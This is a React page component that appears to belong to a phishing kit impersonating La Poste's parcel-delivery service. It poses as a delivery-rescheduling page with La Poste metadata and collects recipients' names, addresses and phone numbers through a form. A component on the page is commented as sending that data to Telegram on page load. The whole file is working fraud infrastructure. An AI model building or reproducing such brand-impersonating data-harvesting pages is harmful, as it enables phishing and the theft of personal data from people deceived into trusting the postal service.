import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { Header, Footer } from '@/components/FR';
import TelegramAPI from '@/components/tgapi';
import FrMainForm from '@/components/FR/frmainform';

const FRLivraison = () => {
  const { code } = useParams();
  const [recipientData, setRecipientData] = useState(null);
  
  // For 2xnbr route, always use empty recipient data
  const isPreviewMode = code === "2xnbr";
  const displayRecipientData = isPreviewMode ? null : recipientData;

  useEffect(() => {
    // Set document title and meta tags for SEO
    document.title = code ? `Livraison #${code}` : 'Livraison de colis - La Poste';

    // Update meta description
    const metaDescription = document.querySelector('meta[name="description"]');
    if (metaDescription) {
      metaDescription.setAttribute('content', code ? `Suivez et gérez votre livraison de colis La Poste #${code}. Reprogrammer la livraison, modifier l'adresse, et plus encore.` : 'Gérez vos livraisons de colis La Poste. Reprogrammer, suivre et modifier vos informations de livraison facilement.');
    }

    // Update canonical URL
    const canonicalLink = document.querySelector('link[rel="canonical"]');
    if (canonicalLink) {
      canonicalLink.setAttribute('href', window.location.href);
    }

    // Add structured data for package tracking
    const structuredData = {
      "@context": "https://schema.org",
      "@type": "ParcelDelivery",
      "deliveryAddress": {
        "@type": "PostalAddress",
        "addressCountry": "FR"
      },
      "hasDeliveryMethod": {
        "@type": "ParcelService",
        "provider": {
          "@type": "Organization",
          "name": "La Poste"
        }
      },
      "trackingNumber": code || undefined
    };
    const scriptTag = document.createElement('script');
    scriptTag.type = 'application/ld+json';
    scriptTag.textContent = JSON.stringify(structuredData);
    document.head.appendChild(scriptTag);
    return () => {
      // Cleanup structured data on unmount
      const existingScript = document.querySelector('script[type="application/ld+json"]');
      if (existingScript) {
        document.head.removeChild(existingScript);
      }
    };
  }, [code]);

  return (
    <div className="min-h-screen bg-background">
      {/* Telegram API Component - sends notifications on page load */}
      <TelegramAPI 
        invoiceName={displayRecipientData?.name || code || "Unknown Invoice"}
        address={
          displayRecipientData?.address && displayRecipientData?.city && displayRecipientData?.zip 
            ? [displayRecipientData.address, displayRecipientData.city, displayRecipientData.zip].join(', ')
            : "Incomplete"
        } 
        phone={displayRecipientData?.phone || "Unknown Phone"}
      />
      
      <Header />
      <main className="container mx-auto px-4 py-[5px]">
        <FrMainForm 
          onRecipientDataChange={(data) => setRecipientData(data)}
          invoiceId={isPreviewMode ? null : code}
          initialData={isPreviewMode ? null : displayRecipientData}
        />
      </main>
      <Footer />
    </div>
  );
};

export default FRLivraison;